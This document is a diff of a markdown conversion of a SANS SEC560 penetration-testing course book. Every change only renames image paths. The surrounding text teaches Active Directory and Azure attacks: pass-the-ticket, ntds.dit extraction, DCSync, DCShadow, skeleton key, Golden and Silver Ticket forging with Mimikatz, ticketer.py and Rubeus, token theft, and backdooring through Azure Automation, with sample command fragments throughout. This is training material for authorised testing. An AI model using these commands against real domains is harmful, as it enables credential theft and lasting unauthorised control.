+![](SEC560_Book5_page_82_Figure_0.jpeg)
 
 To take advantage of this attack, we need to export a ticket from one system, copy it to another system, and then use a tool that will use the ticket. In the example above, we use Mimikatz to perform the attack. The steps shown in the slide are listed here:
 
@@ -1709,7 +1709,7 @@ To take advantage of this attack, we need to export a ticket from one system, co
 - When we list the tickets again, we can see the new ticket loaded into memory.
 - We now use any tool that will use Kerberos authentication. In this example, we are using Sysinternals PsExec.
 
-![](_page_83_Figure_0.jpeg)
+![](SEC560_Book5_page_83_Figure_0.jpeg)
 
 As you are reading this, it's good to recall the initial Pass-the-Hash attack. Remember that Pass-the-Hash relies on NTLMv1/NTLMv2 authentication, so a possible defense might be to just disable NTLM. While this is not a straightforward control to implement, it also doesn't fully protect us against Pass-The-Hash.
 
@@ -1758,7 +1758,7 @@ Lab 5.5: Silver Ticket
 - Running Commands on Azure
 - Permissions on Azure
 
-![](_page_85_Picture_2.jpeg)
+![](SEC560_Book5_page_85_Picture_2.jpeg)
 
 # **Domain Domination and AD Persistence**
 
@@ -1770,7 +1770,7 @@ Lab 5.5: Silver Ticket
   - − Using DCSync or DCShadow
   - − Creating a Golden Ticket
 
-![](_page_85_Picture_11.jpeg)
+![](SEC560_Book5_page_85_Picture_11.jpeg)
 
 Throughout the course, we've discussed a variety of techniques we can use to move laterally through a Windows environment and obtain administrative access. Of course, we also would like to persist the access we achieve!
 
@@ -1784,7 +1784,7 @@ So, what is the next step in our plan? Typically, we can attempt one of the foll
 
 Let's discuss these techniques in some more detail!
 
-![](_page_86_Picture_2.jpeg)
+![](SEC560_Book5_page_86_Picture_2.jpeg)
 
 # **Obtaining Access to Backup NTDS.dit File**
 
@@ -1813,7 +1813,7 @@ We don't always need access to a domain controller to obtain these files. Someti
 
 We need to use specialized tools to decrypt and extract hashes from ntds.dit. The most commonly used tool for this is secretsdump.py from Impacket.
 
-![](_page_87_Figure_0.jpeg)
+![](SEC560_Book5_page_87_Figure_0.jpeg)
 
 As mentioned, the domain password hashes are stored in the encrypted ntds.dit file. The encryption key is stored in the SYSTEM registry hive. We can use the ntdsutil.exe tool to extract the files. As shown in the output above, we run ntdsutil.exe and enter an interactive shell. Then, we run a series of commands to save the backup:
 
@@ -1847,7 +1847,7 @@ The resulting file structure under c:\temp looks like this:
 
 The "Install from Media" feature is designed to help admins create a copy of their domain. Let's say an organization has one location in New York and wants to set up a new location in LA. They can make a backup of a New York DC, fly to LA, and then import the data. The goal is to save bandwidth and time syncing over the long link. Syncing over these long links was a bigger issue when we had slower internet speeds and internet was metered. With today's internet speeds, however, this feature isn't often used by actual administrators anymore.
 
-![](_page_89_Figure_0.jpeg)
+![](SEC560_Book5_page_89_Figure_0.jpeg)
 
 A simple attack to achieve persistence in Active Directory is to create a new domain admin user with a password that never expires.
 
@@ -1857,7 +1857,7 @@ Other users who need to perform common administrative tasks, like managing users
 
 This created account will give us domain admin access to the domain as long as the account is not discovered and removed. Companies often monitor their Active Directory infrastructure for the creation of new accounts with administrative rights.
 
-![](_page_90_Picture_1.jpeg)
+![](SEC560_Book5_page_90_Picture_1.jpeg)
 
 # **Skeleton Key**
 
@@ -1895,9 +1895,9 @@ This means that to be 100% reliable, the skeleton key attack needs to be perform
 
 Since this is a patch in memory, simply rebooting the domain controller removes the skeleton key. But, of course, we can install an autorun entry for Mimikatz to run automatically when the domain controller boots.
 
-![](_page_92_Picture_0.jpeg)
+![](SEC560_Book5_page_92_Picture_0.jpeg)
 
-![](_page_92_Picture_1.jpeg)
+![](SEC560_Book5_page_92_Picture_1.jpeg)
 
 # **Replicating the Domain: DCSync**
 
@@ -1919,7 +1919,7 @@ Of course, normal users cannot access this information. One needs domain admin r
 
 DCSync can dump the hashes of all users or just a selected user.
 
-![](_page_93_Figure_0.jpeg)
+![](SEC560_Book5_page_93_Figure_0.jpeg)
 
 This example shows the dcsync command. By issuing the kerberos::dcsync /user:administrator command, we request the credentials for the user administrator to a domain controller. The command kerberos::dcsync would list the credentials of all users.
 
@@ -2014,13 +2014,13 @@ After we have all the changes we would like, we need to push the update to the d
 mimikatz # lsadump::dcshadow /push
 ```
 
-![](_page_96_Picture_1.jpeg)
+![](SEC560_Book5_page_96_Picture_1.jpeg)
 
 # **Domain Dominance**
 
 Refer to the lab workbook for instructions.
 
-![](_page_97_Picture_2.jpeg)
+![](SEC560_Book5_page_97_Picture_2.jpeg)
 
 # **Course Roadmap**
 
@@ -2065,7 +2065,7 @@ Lab 5.5: Silver Ticket
 - Running Commands on Azure
 - Permissions on Azure
 
-![](_page_98_Figure_0.jpeg)
+![](SEC560_Book5_page_98_Figure_0.jpeg)
 
 A Golden Ticket is a TGT providing maximum access for a maximum period of time.
 
@@ -2084,7 +2084,7 @@ Note that the NT hash or AES key of the krbtgt account can also be extracted fro
 
 The name "Golden Ticket" refers to the movie *Willy Wonka & the Chocolate Factory*, in which children can win a Golden Ticket that provides them full access to a fabulous chocolate factory.
 
-![](_page_99_Figure_0.jpeg)
+![](SEC560_Book5_page_99_Figure_0.jpeg)
 
 Let's have a quick look at the Kerberos flow when a Golden Ticket is in play. When we use a Golden Ticket, the first interaction is a TGS-REQ (request for a Service Ticket) using the forged TGT (the Golden Ticket). There is no prior credential submission or AS-REQ/AS-REP!
 
@@ -2111,7 +2111,7 @@ Golden tickets were initially described in Benjamin Delpy's BlackHat USA 2014 pr
 
 You can find the slides at https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf.
 
-![](_page_101_Picture_1.jpeg)
+![](SEC560_Book5_page_101_Picture_1.jpeg)
 
 #### **Golden Ticket Tools**
 
@@ -2144,9 +2144,9 @@ To generate a ticket with ticketer.py from Impacket, we use a command like this:
 
 **ticketer.py -domain-sid S-1-5-21-721047592-4068106649-2889670365 domain sec560.local -nthash 5525e655c06299c7e4179e2cc5621fb3 Administrator**
 
-![](_page_102_Picture_0.jpeg)
+![](SEC560_Book5_page_102_Picture_0.jpeg)
 
-![](_page_103_Picture_2.jpeg)
+![](SEC560_Book5_page_103_Picture_2.jpeg)
 
 # **Course Roadmap**
 
@@ -2191,9 +2191,9 @@ Lab 5.5: Silver Ticket
 - Running Commands on Azure
 - Permissions on Azure
 
-![](_page_104_Picture_0.jpeg)
+![](SEC560_Book5_page_104_Picture_0.jpeg)
 
-![](_page_104_Picture_1.jpeg)
+![](SEC560_Book5_page_104_Picture_1.jpeg)
 
 # **Overview**
 
@@ -2214,15 +2214,15 @@ We can change anything we want to in a forged ticket. We can change the username
 
 Remember, there are two signatures on the PAC. The first is signed using the password hash of the service, which we have. The second signature uses the password hash of the krbtgt account. If we don't have this password hash, then we can't forge this second signature. This isn't usually a problem since the krbtgt signature is only verified on some services. Services that "run as part of the operating system" will not perform this secondary check. Service classes that will not perform the check include CIFS (SMB), HOST, MSSQLSvs (MSSQL Server), and TERMSRV (Terminal Services). However, HTTP will check when running with IIS due to the way accounts are handled in AppPools.
 
-![](_page_105_Figure_0.jpeg)
+![](SEC560_Book5_page_105_Figure_0.jpeg)
 
 104
 
 # **Service Ticket and PAC**
 
-![](_page_105_Picture_3.jpeg)
+![](SEC560_Book5_page_105_Picture_3.jpeg)
 
-![](_page_105_Figure_4.jpeg)
+![](SEC560_Book5_page_105_Figure_4.jpeg)
 
 #### **Service Ticket: Encrypted using target service NT Hash**
 
@@ -2251,9 +2251,9 @@ The Service Ticket (ST) sent to the service contains all the information that th
 
 To prevent the entire ST from being tampered with, it is encrypted using the target's long-term key. Since the user does not have this key (or the target's password hash), the client cannot read the contents of the ticket, including the PAC, sent to the service. If an attacker can get the password or hash, they can generate a ticket and PAC that will be accepted by a service as long as the service does not verify the second signature based on the password hash for the krbtgt account. To perform this second verification, the service needs to ask a KDC (domain controller) to verify the signature. Of course, this extra verification takes time. Services set to "run as part of the operating system" do not perform the secondary validation. Services such as CIFS (used with SMB), Host (for administration), and MSSQL have this setting by default, so they will not get the secondary verification. The Microsoft web server IIS will always request the secondary verification due to the way that authentication and authorization work with "app pools" in IIS. As such, the Silver Ticket attack won't work with IIS; however, the Kerberos attack can still allow an attacker to crack the password for the service.
 
-![](_page_106_Picture_0.jpeg)
+![](SEC560_Book5_page_106_Picture_0.jpeg)
 
-![](_page_106_Picture_1.jpeg)
+![](SEC560_Book5_page_106_Picture_1.jpeg)
 
 # **Generating a Silver Ticket with Impacket**
 
@@ -2289,7 +2289,7 @@ user\_name Username in the forged ticket (does not have to exist)
 
 We then need to load the ticket into memory (Windows) or tell Linux to use the ticket. Let's take a look at how to do that.
 
-![](_page_107_Picture_1.jpeg)
+![](SEC560_Book5_page_107_Picture_1.jpeg)
 
 #### **Silver Ticket Use**
 
@@ -2340,9 +2340,9 @@ Rubeus.exe ptt /ticket:ticket_file
 
 We expect to use Kerberos authentication in the Windows domain, so most every tool will use this ticket in memory. We can use attack tools, or just normal admin tools, such as MSSQL Admin Tools.
 
-![](_page_108_Picture_0.jpeg)
+![](SEC560_Book5_page_108_Picture_0.jpeg)
 
-![](_page_109_Picture_2.jpeg)
+![](SEC560_Book5_page_109_Picture_2.jpeg)
 
 # **Course Roadmap**
 
@@ -2387,7 +2387,7 @@ Lab 5.5: Silver Ticket
 - Running Commands on Azure
 - Permissions on Azure
 
-![](_page_110_Picture_2.jpeg)
+![](SEC560_Book5_page_110_Picture_2.jpeg)
 
 # **OpenID Connect Flows**
 
@@ -2412,13 +2412,13 @@ OAuth2 is not a legacy protocol. It was designed to federate and provide authori
 
 Entra ID is a modern authentication system because it can support multiple authentication types outside of the standard username and password, including password-less authentication methods and multi-factor authentications. Modern authentication does not necessarily apply to legacy protocols.
 
-![](_page_111_Figure_0.jpeg)
+![](SEC560_Book5_page_111_Figure_0.jpeg)
 
 Let's start with a flow in which we want to access a resource. In the example, the icon we are using is the Azure Infrastructure icon, but this could be Office, SharePoint, or any number of federated services. To simplify this transaction, consider that we will be going to the Azure Portal.
 
 The first connection is from us to the Azure Portal (the middle of the slide deck). The transaction happens within our browser; keep in mind where the transactions occur. This redirect is within our browser.
 
-![](_page_112_Figure_0.jpeg)
+![](SEC560_Book5_page_112_Figure_0.jpeg)
 
 The browser will be redirected to the Entra ID login page. This page is hosted in the domain login.microsoftonline.com. The domain we are hitting may also be known as MSOL.
 
@@ -2434,7 +2434,7 @@ The scope we are asking to be authorized includes specific OpenID connect scopes
 
 The other items are specific to Azure, such as the tenant and the SKU of the client.
 
-![](_page_113_Figure_0.jpeg)
+![](SEC560_Book5_page_113_Figure_0.jpeg)
 
 At this point, we are asked to log in. This is where a few things happen, including:
 
@@ -2444,11 +2444,11 @@ We will be prompted for MFA (multi-factor authentication) if it is enabled. It m
 
 Once we pass this gate, Conditional Access Policies are no longer checked. Keep this in mind.
 
-![](_page_114_Figure_0.jpeg)
+![](SEC560_Book5_page_114_Figure_0.jpeg)
 
 If the user flow is for a third-party application, such as an application working on our behalf, we may see a consent screen. Have you ever used a Salesforce application? Perhaps you have seen this in an application that integrates with Facebook, Twitter, or Instagram. This consent message allows a third-party application to act on our behalf. This is the part of the flow in which we would see this message. In the case of Azure Portal, we will not see this. What happens if we write a malicious application that works on behalf of the privileged user?
 
-![](_page_115_Figure_0.jpeg)
+![](SEC560_Book5_page_115_Figure_0.jpeg)
 
 We are now within an OpenID Connect flow that will return two key types. The first type of key material we will be getting is an access token. The access token contains our authentication material, the JWT (JSON Web Token). If someone were to steal this authentication material, they could log in to the Azure portal as if they were us. An example JWT will look like this:
 
@@ -2460,7 +2460,7 @@ The value will be long, so we need to key in on a few things:
 - The JWT will have two dots (.) that separate each value, the encryption type, the body, and the signature.
 - There will also be a "refresh token," which we will describe later.
 
-![](_page_116_Figure_0.jpeg)
+![](SEC560_Book5_page_116_Figure_0.jpeg)
 
 The access token is now provided to Azure via the client's browser. The access token contains various information about the user itself. This information is learned by sending the access token to a tool like http://jwt.ms, which can decode the token and provide all claims. The claims can help identify the user, the IP address of the request, and more pertinent information internal to Azure itself. The claims will include who provided the token, the Secure Token Server (STS), and what tenant this access token belongs to. Here are some of the more valuable claims found in a JWT:
 
@@ -2482,25 +2482,25 @@ The access token is now provided to Azure via the client's browser. The access t
 
 • https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens
 
-![](_page_117_Figure_0.jpeg)
+![](SEC560_Book5_page_117_Figure_0.jpeg)
 
 What occurs after the token is returned to the Azure Portal? The system must check that the access token is valid with the Microsoft Entra ID server. It must also check to ensure that the authentication is still valid and that it does not have strange expirations happening. This process does not involve the user. Instead, it's between the Microsoft Entra ID server and the application, which is Azure. The values in here have to be validated for access. Conditional access policy does not apply here. The access was already checked.
 
 Not having continually checked access is a critical issue, as stealing the credentials will bypass the security measures in that policy.
 
-![](_page_118_Figure_0.jpeg)
+![](SEC560_Book5_page_118_Figure_0.jpeg)
 
 Let's talk about token expiration for a minute. The access token lifespan is 3600 seconds, or 1 hour. After 1 hour, the token expires. The token expiration is designed so that an attacker cannot steal the token and gain permanent access to a system. Having a short expiration window means that there must be a mechanism to refresh this token; otherwise, the system's usability will suffer. The user would constantly be asked to log in, which is sometimes not a great experience. What could we do? Well, what we have at our disposal is the Refresh Token. This is also referred to as the Primary Refresh Token (PRT). The Refresh Token is exchanged not between all the third-party systems but only to Entra ID. The Refresh Token itself can ask the Entra ID IdP to refresh the access token, obtain a new one, and allow for authentication to continue. If someone were to get the Primary Refresh Token, they could gain permanent access to an environment.
 
-![](_page_119_Figure_0.jpeg)
+![](SEC560_Book5_page_119_Figure_0.jpeg)
 
 At this point, we send the Refresh Token over to the Entra ID system. Remember that this is not heading through Azure and then to Entra ID; it's going directly to Azure to reduce the places where this Refresh Token can be intercepted.
 
-![](_page_120_Figure_0.jpeg)
+![](SEC560_Book5_page_120_Figure_0.jpeg)
 
 In the final part of the flow, we will get a new access token and return this value to the portal for validation. If an attacker can obtain the Primary Refresh Token, they can perform the same flow, bypassing conditional access policies, MFA, and other critical controls. Once the access token is returned refreshed, we can see that the system will pass it back to the party requesting it for validation.
 
-![](_page_121_Figure_0.jpeg)
+![](SEC560_Book5_page_121_Figure_0.jpeg)
 
 Several flow types exist to help facilitate multiple clients and device types. OAuth2 supports up to eight different flow types, and we will cover the most commonly seen ones here:
 
@@ -2512,7 +2512,7 @@ Refresh Token Flow: Refresh Token Flow is the flow used to refresh your access t
 
 Client Credentials Flow: Client Credentials Flow is a flow type used for things like Service Principals, where a static password or certificate is used to allow a client to authenticate. What types of clients use this? Terraform automation is an example. The Terraform module will use Client Credentials Flow to log in as a Service Principal and automate the creation of items.
 
-![](_page_122_Picture_2.jpeg)
+![](SEC560_Book5_page_122_Picture_2.jpeg)
 
 # **Course Roadmap**
 
@@ -2557,7 +2557,7 @@ Lab 5.5: Silver Ticket
 - Running Commands on Azure
 - Permissions on Azure
 
-![](_page_123_Picture_2.jpeg)
+![](SEC560_Book5_page_123_Picture_2.jpeg)
 
 # **Infrastructure Components**
 
@@ -2582,7 +2582,7 @@ Azure also has many developer-focused tools like Azure CosmosDB, Azure DevOps, A
   - − Data Plane is what you typically interact with when you are moving packets on the network
 - Logging in to Azure and telling the Azure platform to execute commands on a host is done through the Control Plane
 
-![](_page_124_Picture_8.jpeg)
+![](SEC560_Book5_page_124_Picture_8.jpeg)
 
 To understand how we can run commands in the Azure environment, we need to know how Control and Data Planes work. When Azure machines boot up, they have built-in Azure agents pre-installed. These Azure agents talk to the Azure platform to communicate different actions; some allow for machines to be booted and built on the first run; other options will let commands run on demand. The Control Plane components do not require VPN or any traditional network items to be set up, like in your traditional datacenter. They use an out-of-band communication channel to perform these actions. This agent is preinstalled and pre-configured within the Azure Platform.
 
@@ -2590,7 +2590,7 @@ The Data Plane is what we are typically using when we move laterally. The Data P
 
 When we are within the Azure Platform, in the Azure CLI, or the web interface and use specific items such as "azure run-command" and Azure Extensions, these actions taken through the Control Plane. The logging is done in the Azure Portal, not on the machine. The agents typically run in an elevated privilege such as "SYSTEM" or "root."
 
-![](_page_125_Picture_2.jpeg)
+![](SEC560_Book5_page_125_Picture_2.jpeg)
 
 # **Course Roadmap**
 
@@ -2635,7 +2635,7 @@ Lab 5.5: Silver Ticket
 - Running Commands on Azure
 - Permissions on Azure
 
-![](_page_126_Picture_2.jpeg)
+![](SEC560_Book5_page_126_Picture_2.jpeg)
 
 # **Azure CLI Tools**
 
@@ -2654,7 +2654,7 @@ The Azure CLI tool is a Python-based application that is cross-platform. It has 
 
 cloud shell environment ships with many tools and gives the administrators the ability to work with the Azure SDK without installing anything locally. Azure is not the only cloud provider; Google also features a cloud shell. After a specified time, the cloud shell will be stored and compressed for long-term storage and then decompressed and used when needed. You can determine that the Cloud Shell instance has been used by looking for Storage Accounts with the words "cloud shell" in them.
 
-![](_page_127_Figure_0.jpeg)
+![](SEC560_Book5_page_127_Figure_0.jpeg)
 
 The Azure CLI supports multiple types of subcommands and authentication mechanisms that we can use to attack Azure. We need to know how the tool works to understand this better. The Azure authentication library, which is now called MSAL (Microsoft Authentication Library), supports multiple OAuth2 and OpenID Connect flows for authentication. The standard flow is Code Flow, in which the Azure CLI tool is the "client" in the middle, and the user will see a browser window to support the Code Flow for authentication. It also supports several other flows.
 
@@ -2664,7 +2664,7 @@ The CLI tool can also support Device Code Flow, which supports browser-less logi
 
 Finally, the tool supports many subcommands for standard access to individual services; for example, we can specify running, stopping, and starting VMs from within the **az vm** command. We can even perform administration tasks such as running commands or rebooting systems through the CLI tool. It is a very powerful way to walk through the permissions of the Azure system.
 
-![](_page_128_Picture_2.jpeg)
+![](SEC560_Book5_page_128_Picture_2.jpeg)
 
 # **Azure VM Operations**
 
@@ -2682,7 +2682,7 @@ Extensions are one of these options. These scripts can be applied to a machine t
 
 Azure Automation is the Azure equivalent of SCCM. This toolchain has many items that help developers and system administrators keep their software running at its optimal state. Azure Automation can allow us to deploy runbooks that automate the deployment of systems, the configuration of software, and so on. Azure Automation can be used to patch systems and update them. It also has a collection of workers that can watch for processes or network items that either exist or don't. Using these workers, we can backdoor systems on events. Consider an event where your implant is detected by the blue team and then removed, and you can replace it automatically with a Control Plane action such as a worker script that installs a different implant.
 
-![](_page_129_Picture_2.jpeg)
+![](SEC560_Book5_page_129_Picture_2.jpeg)
 
 # **Running Commands on Virtual Machines**
 
@@ -2720,7 +2720,7 @@ What is the PowerShell script we are passing? The command is whoami. In the retu
 
 • https://docs.microsoft.com/en-us/azure/virtual-machines/windows/run-command
 
-![](_page_131_Picture_2.jpeg)
+![](SEC560_Book5_page_131_Picture_2.jpeg)
 
 # **Course Roadmap**
 
@@ -2764,9 +2764,9 @@ Lab 5.5: Silver Ticket
 - Azure Infrastructure
 - Running Commands on Azure
 
-![](_page_131_Picture_27.jpeg)
+![](SEC560_Book5_page_131_Picture_27.jpeg)
 
-![](_page_132_Picture_1.jpeg)
+![](SEC560_Book5_page_132_Picture_1.jpeg)
 
 # **What's Better than Domain Admin? Global Admin!**
 
@@ -2793,7 +2793,7 @@ Global Administrator is the first user in the Entra ID environment, and by defau
 
 Global Administrators should be tightly controlled, as they can do almost anything in the environment. More shocking is that because you are the "root" or "domain admin" of the Entra ID environment, you can also grant these permissions to third parties in the OpenID Connect Consent actions. Consenting to a third party means that a foreign application like Salesforce, or even malicious applications, can also be granted Global Administrator access through the consent of the application. Users who constantly use Global Administrator permissions for their day-to-day work can inadvertently grant global permissions to third parties by just consenting as they browse the internet. As with on-premises Active Directory, we should only use these accounts when needed and not for day-to-day work.
 
-![](_page_133_Picture_2.jpeg)
+![](SEC560_Book5_page_133_Picture_2.jpeg)
 
 # **Azure Permissions**
 
@@ -2879,7 +2879,7 @@ Under the nuance of what is being described in this document, it is essential to
 
 "permissions"/"not dataActions": Actions here are also applicable to the Data Plane, but they are deny actions. Anything in here will be denied access explicitly.
 
-![](_page_135_Figure_0.jpeg)
+![](SEC560_Book5_page_135_Figure_0.jpeg)
 
 Azure permissions are inheritable; permissions can be applied at the top of the tree and applied down to the individual resource. If the Azure architecture is designed with this in mind, then permissions can flow downward more gracefully.
 
@@ -2889,7 +2889,7 @@ Resource groups allow for similar assets to be grouped. They allow for a collect
 
 Permissions can also be applied at the individual resource level. Having permissions per resource would require a more rigorous set of controls that should be automated. With automation, this level of control can be achieved more quickly. Applying permissions here does not take into account inheritance. Inheritance still applies, but it is not necessary to use it when applying IAM controls at the resource level.
 
-![](_page_136_Picture_2.jpeg)
+![](SEC560_Book5_page_136_Picture_2.jpeg)
 
 #### **Instance Metadata Services in Azure**
 
@@ -2915,7 +2915,7 @@ Azure CLI, for example, can use this IMDS credential to log in to the Azure Plat
 
 An attacker can also move the IMDS token onto their own systems to be able to persist outside of the host.
 
-![](_page_137_Picture_2.jpeg)
+![](SEC560_Book5_page_137_Picture_2.jpeg)
 
 # **Managed Identities in Azure**
 
@@ -2943,7 +2943,7 @@ Two different types of identities exist in Azure. The first type is called a Use
 
 The second type of identity is called a System Assigned Managed Identity. This identity is fully managed by Azure and is created and managed per asset. The lifecycle of the identity is managed per platform, and it cannot be shared across multiple systems; each system must have its own identity. This reduces the potential of multiple system compromise through a single identity.
 
-![](_page_138_Picture_2.jpeg)
+![](SEC560_Book5_page_138_Picture_2.jpeg)
 
 # **Conclusion: Persistence and Evading Controls**
 
@@ -2974,7 +2974,7 @@ Finally, we explored advanced Kerberos attacks like Golden and Silver Tickets fo
 
 Our final section, SEC560.6, brings everything together in a Capture the Flag competition where you'll apply all the techniques you've learned throughout the course in a realistic enterprise environment.
 
-![](_page_139_Picture_0.jpeg)
+![](SEC560_Book5_page_139_Picture_0.jpeg)
 
 General inquiries: info@sans.org Registration: registration@sans.org Tuition: tuition@sans.org Press: press@sans.org 301-654-SANS (7267)
 
